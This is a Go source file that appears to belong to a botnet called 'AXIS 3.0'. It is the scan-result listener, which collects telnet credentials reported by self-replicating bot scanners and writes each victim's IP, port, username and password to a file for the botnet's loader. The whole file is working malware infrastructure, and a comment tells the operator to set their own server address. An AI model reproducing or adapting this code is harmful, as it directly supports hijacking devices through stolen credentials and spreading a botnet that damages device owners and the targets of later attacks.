// AXIS 3.0 - Scan Result Listener
// ============================================================================
// Receives scan results from bot self-replication scanners
// Listens on TCP port 9555 for incoming reports
// Outputs successful credentials to telnet.txt for loader consumption
// Format: IP:PORT username:password
// ============================================================================

package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"os"
)

// Configuration - change to your server IP
// CHANGE THIS: 0.0.0.0 is placeholder - set to your scan listener IP
const scanListenAddr string = "0.0.0.0:9555"
const outputFile string = "telnet.txt"

func main() {
	fmt.Printf("AXIS 3.0 scanListen starting on %s\n", scanListenAddr)
	fmt.Printf("Output file: %s\n", outputFile)

	l, err := net.Listen("tcp", scanListenAddr)
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		conn, err := l.Accept()
		if err != nil {
			break
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()

	var ip [4]byte
	var port uint16

	// Read IP (4 bytes)
	if err := readXBytes(conn, ip[:]); err != nil {
		return
	}

	// Read port (2 bytes)
	portBuf := make([]byte, 2)
	if err := readXBytes(conn, portBuf); err != nil {
		return
	}
	port = binary.BigEndian.Uint16(portBuf)

	// Read username length and username
	usernameLenBuf := make([]byte, 1)
	if err := readXBytes(conn, usernameLenBuf); err != nil {
		return
	}
	usernameLen := int(usernameLenBuf[0])
	usernameBuf := make([]byte, usernameLen)
	if err := readXBytes(conn, usernameBuf); err != nil {
		return
	}

	// Read password length and password
	passwordLenBuf := make([]byte, 1)
	if err := readXBytes(conn, passwordLenBuf); err != nil {
		return
	}
	passwordLen := int(passwordLenBuf[0])
	passwordBuf := make([]byte, passwordLen)
	if err := readXBytes(conn, passwordBuf); err != nil {
		return
	}

	// Format output
	output := fmt.Sprintf("%d.%d.%d.%d:%d %s:%s\n",
		ip[0], ip[1], ip[2], ip[3],
		port,
		string(usernameBuf),
		string(passwordBuf))

	// Log to console
	fmt.Printf("[SCAN] %s", output)

	// Append to file
	f, err := os.OpenFile(outputFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Error opening output file:", err)
		return
	}
	defer f.Close()

	if _, err := f.WriteString(output); err != nil {
		fmt.Println("Error writing to output file:", err)
	}
}

func readXBytes(conn net.Conn, buf []byte) error {
	tl := 0
	for tl < len(buf) {
		n, err := conn.Read(buf[tl:])
		if err != nil {
			return err
		}
		if n <= 0 {
			return errors.New("Connection closed")
		}
		tl += n
	}
	return nil
}
